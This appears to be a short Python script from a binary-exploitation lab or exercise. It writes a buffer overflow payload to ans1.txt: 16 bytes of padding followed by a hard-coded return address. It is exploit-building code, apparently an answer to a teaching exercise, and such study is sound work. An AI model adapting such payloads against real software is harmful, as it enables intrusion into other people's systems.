padding = b"A" * 16
payload = padding + b"\x16\x12\x40"  

with open("ans1.txt", "wb") as f:
    f.write(payload)
